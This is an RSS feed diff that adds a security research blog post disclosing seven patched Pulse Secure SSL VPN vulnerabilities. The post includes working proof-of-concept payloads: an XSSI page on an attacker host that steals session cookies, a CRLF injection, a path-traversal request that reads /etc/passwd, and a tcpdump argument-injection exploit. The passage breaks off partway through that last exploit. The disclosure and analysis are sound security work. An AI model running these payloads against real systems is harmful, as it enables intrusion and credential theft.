@@ -4,11 +4,317 @@
         <title>DEVCORE 戴夫寇爾</title>
         <description>DEVCORE 戴夫寇爾 - 滲透測試服務、資安教育訓練、資安顧問服務</description>
         <link>https://devco.re</link>
-        <lastBuildDate>Wed, 28 Aug 2019 01:37:29 +0800</lastBuildDate>
-        <pubDate>Wed, 28 Aug 2019 01:37:29 +0800</pubDate>
+        <lastBuildDate>Mon, 02 Sep 2019 21:55:25 +0800</lastBuildDate>
+        <pubDate>Mon, 02 Sep 2019 21:55:25 +0800</pubDate>
         <ttl>1800</ttl>
         <atom:link href="https://devco.re/rss" rel="self" type="application/rss+xml" />
 
+
+        <item>
+                <title>Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study!</title>
+                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;Hi, this is the last part of Attacking SSL VPN series. If you haven’t read previous articles yet, here are the quick links for you:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;After we published our research at Black Hat, due to its great severity and huge impacts, it got lots of attention and discussions. Many people desire first-hand news and wonder when the exploit(especially the Pulse Secure preAuth one) will be released.&lt;/p&gt;
+
+&lt;p&gt;We also discussed this internally. Actually, we could simply drop the whole exploits without any concern and acquire plenty of media exposures. However, as a SECURITY firm, our responsibility is to make the world more secure. So we decided to postpone the public disclosure to give the world more time to apply the patches!&lt;/p&gt;
+
+&lt;p&gt;Unfortunately, the exploits were revealed by someone else. They can be easily found on GitHub&lt;sup&gt;&lt;a href=&quot;https://github.com/milo2012/CVE-2018-13379&quot;&gt;[1]&lt;/a&gt; &lt;a href=&quot;https://github.com/milo2012/CVE-2018-13382&quot;&gt;[2]&lt;/a&gt; &lt;a href=&quot;https://github.com/projectzeroindia/CVE-2019-11510&quot;&gt;[3]&lt;/a&gt;&lt;/sup&gt; and exploit-db&lt;sup&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47297&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt;. Honestly, we couldn’t say they are wrong, because the bugs are absolutely fixed several months ago, and they spent their time differing/reversing/reproducing. But it’s indeed a worth discussing question to the security community: if you have a nuclear level weapon, when is it ready for public disclosure?&lt;/p&gt;
+
+&lt;p&gt;We heard about more than 25 bug bounty programs are exploited. From the statistics of &lt;a href=&quot;https://badpackets.net/over-14500-pulse-secure-vpn-endpoints-vulnerable-to-cve-2019-11510/&quot;&gt;Bad Packet&lt;/a&gt;, numerous Fortune 500, U.S. military, governments, financial institutions and universities are also affected by this. There are even &lt;a href=&quot;https://twitter.com/sherlocksecure/status/1164492373591642112&quot;&gt;10 NASA servers exposed for this bug&lt;/a&gt;. So, these premature public disclosures indeed force these entities to upgrade their SSL VPN, this is the good part.&lt;/p&gt;
+
+&lt;p&gt;On the other hand, the bad part is that there is an increasing number of &lt;a href=&quot;https://www.securityweek.com/hackers-target-vulnerabilities-fortinet-pulse-secure-products&quot;&gt;botnets&lt;/a&gt; scanning the Internet in the meanwhile. An &lt;a href=&quot;https://twitter.com/GossiTheDog/status/1167170305577689091&quot;&gt;intelligence&lt;/a&gt; also points out that there is already a China APT group exploiting this bug. This is such an Internet disaster. Apparently, the world is not ready yet. So, if you haven’t updated your Palo Alto, Fortinet or Pulse Secure SSL VPN, please update it ASAP!&lt;/p&gt;
+
+&lt;h1 id=&quot;about-pulse-secure&quot;&gt;About Pulse Secure&lt;/h1&gt;
+
+&lt;p&gt;Pulse Secure is the market leader of SSL VPN which provides professional secure access solutions for Hybrid IT. Pulse Secure has been in our research queue for a long time because it was a &lt;a href=&quot;https://archive.li/8pzwf&quot;&gt;critical infrastructure of Google&lt;/a&gt;, which is one of our long-term targets. However, Google applies the Zero Trust security model, and therefore the VPN is removed now.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We started to review Pulse Secure in mid-December last year. In the first 2 months, we got nothing. Pulse Secure has a good coding style and security awareness so that it’s hard to find trivial bugs. Here is an interesting comparison, we found the arbitrary file reading &lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt; on FortiGate SSL VPN on our first research day…&lt;/p&gt;
+
+&lt;p&gt;Pulse Secure is also a Perl lover, and writes lots of Perl extensions in C++. The interaction between Perl and C++ is also confusing to us, but we got more familiar with it while we paid more time digging in it. Finally, we got the first blood on &lt;strong&gt;March 8, 2019&lt;/strong&gt;! It’s a stack-based overflow on the management interface! Although this bug isn’t that useful, our research progress got on track since that, and we uncovered more and more bugs.&lt;/p&gt;
+
+&lt;p&gt;We reported all of our finding to Pulse Secure PSIRT on &lt;strong&gt;March 22, 2019&lt;/strong&gt;. Their response is very quick and they take these vulnerabilities seriously! After several conference calls with Pulse Secure, &lt;strong&gt;they fixed all bugs just within a month&lt;/strong&gt;, and released the patches on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. You can check the detailed &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/&quot;&gt;security advisory&lt;/a&gt;!&lt;/p&gt;
+
+&lt;p&gt;It’s a great time to work with Pulse Secure. From our perspective, Pulse Secure is the most responsible vendor among all SSL VPN vendors we have reported bugs to!&lt;/p&gt;
+
+&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;
+
+&lt;p&gt;We have found 7 vulnerabilities in total. Here is the list. We will introduce each one but focus on the CVE-2019-11510 and CVE-2019-11539 more.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;affected-versions&quot;&gt;Affected versions&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Pulse Connect Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
+  &lt;li&gt;Pulse Connect Secure 8.3R1 - 8.3R7&lt;/li&gt;
+  &lt;li&gt;Pulse Connect Secure 8.2R1 - 8.2R12&lt;/li&gt;
+  &lt;li&gt;Pulse Connect Secure 8.1R1 - 8.1R15&lt;/li&gt;
+  &lt;li&gt;Pulse Policy Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
+  &lt;li&gt;Pulse Policy Secure 5.4R1 - 5.4R7&lt;/li&gt;
+  &lt;li&gt;Pulse Policy Secure 5.3R1 - 5.3R12&lt;/li&gt;
+  &lt;li&gt;Pulse Policy Secure 5.2R1 - 5.2R12&lt;/li&gt;
+  &lt;li&gt;Pulse Policy Secure 5.1R1 - 5.1R15&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;cve-2019-11540-cross-site-script-inclusion&quot;&gt;CVE-2019-11540: Cross-Site Script Inclusion&lt;/h2&gt;
+
+&lt;p&gt;The script &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/cs/cs.cgi&lt;/code&gt; renders the session ID in JavaScript. As the content-type is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;application/x-javascript&lt;/code&gt;, we could perform the XSSI attack to steal the DSID cookie!&lt;/p&gt;
+
+&lt;p&gt;Even worse, the CSRF protection in Pulse Secure SSL VPN is based on the DSID. With this XSSI, we can bypass all the CSRF protection!&lt;/p&gt;
+
+&lt;p&gt;PoC:&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- http://attacker/malicious.html --&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/dana/cs/cs.cgi?action=appletobj&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;writeln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DSID&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;ReplaceContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;cve-2019-11507-cross-site-scripting&quot;&gt;CVE-2019-11507: Cross-Site Scripting&lt;/h2&gt;
+
+&lt;p&gt;There is a CRLF Injection in &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/home/cts_get_ica.cgi&lt;/code&gt;. Due to the injection, we can forge arbitrary HTTP headers and inject malicious HTML contents.&lt;/p&gt;
+
+&lt;p&gt;PoC:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana/home/cts_get_ica.cgi
+?bm_id=x
+&amp;amp;vdi=1
+&amp;amp;appname=aa%0d%0aContent-Type::text/html%0d%0aContent-Disposition::inline%0d%0aaa:bb&amp;lt;svg/onload=alert(document.domain)&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;cve-2019-11538-post-authuser-arbitrary-file-reading-via-nfs&quot;&gt;CVE-2019-11538: Post-auth(user) Arbitrary File Reading via NFS&lt;/h2&gt;
+
+&lt;p&gt;The following two vulnerabilities (CVE-2019-11538 and CVE-2019-11508) do not affect default configurations. It appears only if the admin configures the NFS sharing for the VPN users.&lt;/p&gt;
+
+&lt;p&gt;If an attacker can control any files on remote NFS server, he can just create a symbolic link to any file, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, and read it from web interface. The root cause is that the implementation of NFS mounts the remote server as a real Linux directory, and the script &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/fb/nfs/nfb.cgi&lt;/code&gt; does not check whether the accessed file is a symlink or not!&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-2019-11508-post-authuser-arbitrary-file-writing-via-nfs&quot;&gt;CVE-2019-11508: Post-auth(user) Arbitrary File Writing via NFS&lt;/h2&gt;
+
+&lt;p&gt;This one is a little bit similar to the previous one, but with a different attack vector!&lt;/p&gt;
+
+&lt;p&gt;When the attacker uploads a ZIP file to the NFS through the web interface, the script &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/fb/nfs/nu.cgi&lt;/code&gt; does not sanitize the filename in the ZIP. Therefore, an attacker can build a malicious ZIP file and traverse the path with &lt;code class=&quot;highlighter-rouge&quot;&gt;../&lt;/code&gt; in the filename! Once Pulse Secure decompresses, the attacker can upload whatever he wants to whatever path!&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-2019-11542-post-authadmin-stack-buffer-overflow&quot;&gt;CVE-2019-11542: Post-auth(admin) Stack Buffer Overflow&lt;/h2&gt;
+
+&lt;p&gt;There is a stack-based buffer overflow in the following Perl module implementations:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;DSHC::ConsiderForReporting&lt;/li&gt;
+  &lt;li&gt;DSHC::isSendReasonStringEnabled&lt;/li&gt;
+  &lt;li&gt;DSHC::getRemedCustomInstructions&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;These implementations use &lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf&lt;/code&gt; to concatenate strings without any length check, which leads to the buffer overflow. The bug can be triggered in many places, but here we use &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana-admin/auth/hc.cgi&lt;/code&gt; as our PoC.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana-admin/auth/hc.cgi
+?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&amp;amp;policyid=0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And you can observed the segment fault from &lt;code class=&quot;highlighter-rouge&quot;&gt;dmesg&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cgi-server[22950]: segfault at 61616161 ip 0000000002a80afd sp 00000000ff9a4d50 error 4 in DSHC.so[2a2f000+87000]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;cve-2019-11510-pre-auth-arbitrary-file-reading&quot;&gt;CVE-2019-11510: Pre-auth Arbitrary File Reading&lt;/h2&gt;
+
+&lt;p&gt;Actually, this is the most severe bug in this time. It is in the web server implementation. As our slides mentioned, Pulse Secure implements their own web server and architecture stack from scratch. The original path validation is very strict. However, since version 8.2, Pulse Secure introduced a new feature called &lt;code class=&quot;highlighter-rouge&quot;&gt;HTML5 Access&lt;/code&gt;, it’s a feature used to interact with Telnet, SSH, and RDP by browsers. Thanks to this new feature, the original path validation becomes loose.&lt;/p&gt;
+
+&lt;p&gt;In order to handle the static resources, Pulse Secure created a new IF-CONDITION to widen the originally strict path validation. The code wrongly uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;request-&amp;gt;uri&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt;, so that we can specify the &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the end of the query string to bypass the validation and make &lt;code class=&quot;highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt; to any file you want to download!&lt;/p&gt;
+
+&lt;p&gt;And it’s worth to mention that in order to read arbitrary files, you must to specify the &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the middle of the path again. Otherwise, you can only download limited file extensions such as .json, .xml or .html.&lt;/p&gt;
+
+&lt;p&gt;Due to the exploit is in the wild, there is no longer any concern to show the payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-2019-11539-post-authadmin-command-injection&quot;&gt;CVE-2019-11539: Post-auth(admin) Command Injection&lt;/h2&gt;
+
+&lt;p&gt;The last one is a command injection on the management interface. We found this vulnerability very early, but could not find a way to exploit it at first. While we were in Vegas, one of my friends told me that he found the same bug before, but he didn’t find a way to exploit it, so he didn’t report to the vendor.&lt;/p&gt;
+
+&lt;p&gt;However, we did it, and we exploit it in a very smart way :)&lt;/p&gt;
+
+&lt;p&gt;The root cause of this vulnerability is very simple. Here is a code fragment of &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana-admin/diag/diag.cgi&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;CGI::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;options&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$TCPDUMP_COMMAND -d $options &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;undef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It’s so obvious and straightforward that everyone can point out there is a command injection at the parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;options&lt;/code&gt;! However, is it that easy? No!&lt;/p&gt;
+
+&lt;p&gt;In order to avoid potential vulnerabilities, Pulse Secure applies lots of hardenings on their products! Such as the system integrity check, read-only filesystem and a module to hook all dangerous Perl invocations like &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;open&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;backtick&lt;/code&gt;…&lt;/p&gt;
+
+&lt;p&gt;This module is called &lt;code class=&quot;highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt;. It implements its own command line parser and re-implements the I/O redirections in Perl. Here is &lt;a href=&quot;https://gist.github.com/orangetw/d8df11b147629bb320e7db903c7e7147&quot;&gt;the code fragments on Gist&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;From the code fragments, you can see it replaces the original &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; and do lots of checks in &lt;code class=&quot;highlighter-rouge&quot;&gt;__parsecmd&lt;/code&gt;. It also blocks numerous bad characters such as:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[\&amp;amp;\*\(\)\{\}\[\]\`\;\|\?\n~&amp;lt;&amp;gt;]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The checks are very strict so that we can not perform any command injection. We imagined several ways to bypass that, and the first thing came out of my mind is the argument injection. We listed all arguments that &lt;code class=&quot;highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; supports and found that the &lt;code class=&quot;highlighter-rouge&quot;&gt;-z postrotate-command&lt;/code&gt; may be useful. But the sad thing is that the &lt;code class=&quot;highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; in Pulse Secure is too old(v3.9.4, Sept 2005) to support this juicy feature, so we failed :(&lt;/p&gt;
+
+&lt;p&gt;While examining the system, we found that although the webroot is read-only, we can still abuse the cache mechanism. Pulse Secure caches the template result in &lt;code class=&quot;highlighter-rouge&quot;&gt;/data/runtime/tmp/tt/&lt;/code&gt; to speed up script rendering. So our next attempt is to write a file into the template cache directory via &lt;code class=&quot;highlighter-rouge&quot;&gt;-w write-file&lt;/code&gt; argument. However, it seems impossible to write a polyglot file in both PCAP and Perl format.&lt;/p&gt;
+
+&lt;p&gt;As it seems we had reached the end of argument injection, we tried to dig deeper into the &lt;code class=&quot;highlighter-rouge&quot;&gt;DSSFAFE.pm&lt;/code&gt; implementation to see if there is anything we can leverage. Here we found a defect in the command line parser. If we insert an incomplete I/O redirection, the rest of the redirection part will be truncated. Although this is a tiny flaw, it helped us to re-control the I/O redirections! However, the problem that we can’t generate a valid Perl script still bothered us.&lt;/p&gt;
+
+&lt;p&gt;We got stuck here, and it’s time to think out of the box. It’s hard to generate a valid Perl script via &lt;code class=&quot;highlighter-rouge&quot;&gt;STDOUT&lt;/code&gt;, could we just write the Perl by &lt;code class=&quot;highlighter-rouge&quot;&gt;STDERR&lt;/code&gt;? The answer is yes. When we force the &lt;code class=&quot;highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; to read a nonexistent-file via &lt;code class=&quot;highlighter-rouge&quot;&gt;-r read-file&lt;/code&gt;. It shows the error:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;tcpdump: [filename]: No such file or directory&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;It seems we can “&lt;strong&gt;partially&lt;/strong&gt;” control the error message. Then we tried the filename &lt;code class=&quot;highlighter-rouge&quot;&gt;print 123#&lt;/code&gt;, and the magic happens!&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;print 123#&#39;&lt;/span&gt;
+  tcpdump: print 123#: No such file or directory
+ 
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;print 123#&#39;&lt;/span&gt; 2&amp;gt;&amp;amp;1 | perl –
+  123
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The error message becomes a valid Perl script now. Why? OK, let’s have a Perl 101 lesson now!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, Perl supports the GOTO label, so the &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump: &lt;/code&gt; becomes a valid label in Perl. Then, we comment the rest with a hashtag. With this creative trick, we can generate any valid Perl now!&lt;/p&gt;
+
+&lt;p&gt;Finally, we use an incomplete I/O symbol &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; to fool the &lt;code class=&quot;highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt; command parser and redirect the &lt;code class=&quot;highlighter-rouge&quot;&gt;STDERR&lt;/code&gt; into the cache directory! Here is the final exploit:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-r$x=&quot;ls /&quot;,system$x# 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The concatenated command looks like:&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/sbin/tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 
+ &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;$x=&quot;ls /&quot;,system$x#&#39;&lt;/span&gt;
